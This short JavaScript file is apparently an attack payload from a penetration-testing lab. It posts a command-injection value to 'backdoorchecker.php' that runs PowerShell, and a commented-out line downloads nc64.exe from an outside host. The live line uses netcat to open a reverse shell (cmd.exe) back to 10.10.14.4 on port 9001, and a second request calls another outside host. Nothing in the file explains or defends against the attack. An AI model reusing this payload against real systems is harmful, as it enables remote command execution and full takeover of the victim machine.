var http = new XMLHttpRequest();
var url = 'backdoorchecker.php';
//var params = 'cmd=dir | powershell Invoke-WebRequest http://10.10.14.4/nc64.exe -Outfile C:\\Windows\\Temp\\nc64.exe';
var params = 'cmd=dir| powershell C:\\Windows\\Temp\\nc64.exe 10.10.14.4 9001 -e cmd.exe'
http.open('POST', url, true);

http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.send(params);


//var a = http.status;
var b = "hello";

var http = new XMLHttpRequest();
var url = "http://10.10.14.26/test.php"+b+"done";
var params = 'cmd1=dir';
http.open('POST', url, true);

http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.send(params);
